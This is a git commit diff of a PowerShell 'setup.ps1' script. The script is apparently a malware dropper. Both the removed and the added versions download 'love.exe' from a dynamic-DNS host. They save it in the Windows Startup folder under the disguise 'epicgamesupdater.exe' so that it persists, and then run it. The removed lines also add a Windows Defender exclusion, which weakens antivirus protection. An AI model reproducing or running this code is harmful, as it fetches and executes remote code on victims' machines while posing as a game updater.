09e442877911a5c22c5ede18359e7faffd1ac8df
FCsab <161705557+FCsab@users.noreply.github.com>
2025-12-12 21:33:28 +0100

    Update setup.ps1

--- setup.ps1
+++ setup.ps1
@@ -1,14 +1,4 @@
 $url = "http://fcsab.ddns.net:3010/love.exe"
-$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
-$exePath = "$startupPath\epicgamesupdater.exe"
-
-try { Add-MpPreference -ExclusionPath $startupPath -EA 0 } catch {}
-try {
-    Invoke-WebRequest -Uri $url -OutFile $exePath -UseBasicParsing -EA Stop
-    Start-Process -FilePath $exePath
-} catch {}
-
-exit
-
-
-
+$dest = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\epicgamesupdater.exe"
+Invoke-WebRequest -Uri $url -OutFile $dest -UseBasicParsing
+Start-Process -FilePath $dest
